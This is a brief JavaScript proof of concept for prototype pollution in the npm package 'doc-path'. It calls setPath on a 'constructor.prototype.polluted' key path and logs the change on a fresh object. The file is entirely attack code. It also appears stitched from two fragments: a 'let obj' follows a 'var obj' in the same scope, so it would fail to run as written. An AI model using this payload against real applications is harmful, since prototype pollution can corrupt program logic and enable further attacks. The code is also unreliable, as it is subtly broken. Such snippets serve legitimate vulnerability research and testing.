var obj = {};
obj.__proto__.polluted = undefined;
Object.defineProperty(obj, '__proto__', {
    value: obj.__proto__,
    writable: true,
    enumerable: true,
    configurable: true
});
const path = require('doc-path');
let obj = {};
console.log({}.polluted);
path.setPath(obj, 'constructor.prototype.polluted', 'yes');
console.log({}.polluted);